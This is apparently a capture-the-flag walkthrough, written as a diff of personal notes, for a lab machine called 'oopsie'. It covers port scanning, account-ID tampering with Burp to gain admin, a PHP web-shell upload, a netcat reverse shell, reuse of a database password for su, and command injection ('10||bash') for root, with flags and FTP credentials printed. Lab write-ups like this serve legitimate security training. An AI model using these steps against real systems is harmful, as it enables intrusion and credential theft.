@@ -1,0 +1,149 @@
+>> nmap -p- --min-rate=1000 -sS -A -T4 10.10.10.28
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome
+
+
+
+80 -- landing page, Apache/2.4.29 (Ubuntu)
+view-source:http://10.10.10.28/js/min.js ? strange js
++44 (0)123 456 789 admin@megacorp.com
+
+Try to "burp"
+Start as a default proxy. Examin site map. There is a hidden login page.
+http://10.10.10.28/cdn-cgi/login/
+
+Playing in burp with values, we see that we can change the id values for a content.
+
+Burp => Intruder => Positions (only content id for accounts) => 
+Payload (generate list of ids in bash) =>  Options (always follow redirect)
+
+From responses with different length we find
+
+id=30
+Access Id=86575
+login=super admin
+email=superadmin@megacorp.com
+
+Intercept upload request -> change login and AccessId to super admin -> we can upload now
+
+php-cgi-shell
+https://github.com/jgor/php-cgi-shell
+ferrari sh_14589.php
+Upload with changing role and id
+
+Now need to find out where the uploads go
+We may guess that they are 'images' or 'uploads'
+And we may use dirsearch tool
+
+>> python3 dirsearch.py -u 10.10.10.28 -e php
+We found the sames dirs in there
+
+shell is getting removed by cron, so need to try reverse shell
+>> sudo nc -lvnp 80
+>> cp /usr/share/webshells/php/php-reverse-shell.php ./rs.php
+
+whoami
+www-data
+
+>> cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+
+>> cat db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+We found the MySQL creds while in the user session
+
+Upgrading simple shell to interactive shell
+>> SHELL=/bin/bash script -q /dev/null
+>> Ctrl-Z
+>> stty raw -echo
+>> fg
+>> reset
+>> xterm
+
+Time to go to mysql
+>> mysql -urobert -pM3g4C0rpUs3r! garage
+show databases; show grants;
+nothing in db, that I can understand
+
+>> su robert
+with the same pass as for DB
+>> id
+id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+
+Bugtracker is some programm. If there is a ticket => it prints it
+>> robert@oopsie:/$ bugtracker
+	bugtracker
+
+	------------------
+	: EV Bug Tracker :
+	------------------
+
+	Provide Bug ID: 3
+	3
+	---------------
+
+	Hello,
+	........
+If there is no, it returns the error
+>> robert@oopsie:/$ bugtracker --help
+	------------------
+	: EV Bug Tracker :
+	------------------
+
+	Provide Bug ID: 10
+	10
+	---------------
+
+	cat: /root/reports/10: No such file or directory
+
+
+Little play around
+>> robert@oopsie:/$ bugtracker 
+	bugtracker
+
+	------------------
+	: EV Bug Tracker :
+	------------------
+
+	Provide Bug ID: 10||bash
+	10||bash
+	---------------
+
+	cat: /root/reports/10: No such file or directory
+	root@oopsie:/# ls -la
+
+And robert is the root now
+
+>> cat root.txt
+af13b0bee69f8a877c3faf667f7beacf
+
+Plus more
+
+>> cat filezilla.xml 
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<FileZilla3>
+    <RecentServers>
+        <Server>
+            <Host>10.10.10.44</Host>
+            <Port>21</Port>
+            <Protocol>0</Protocol>
+            <Type>0</Type>
+            <User>ftpuser</User>
+            <Pass>mc@F1l3ZilL4</Pass>
+            <Logontype>1</Logontype>
+            <TimezoneOffset>0</TimezoneOffset>
+            <PasvMode>MODE_DEFAULT</PasvMode>
+            <MaximumMultipleConnections>0</MaximumMultipleConnections>
+            <EncodingType>Auto</EncodingType>
+            <BypassProxy>0</BypassProxy>
+        </Server>
+    </RecentServers>
+</FileZilla3>
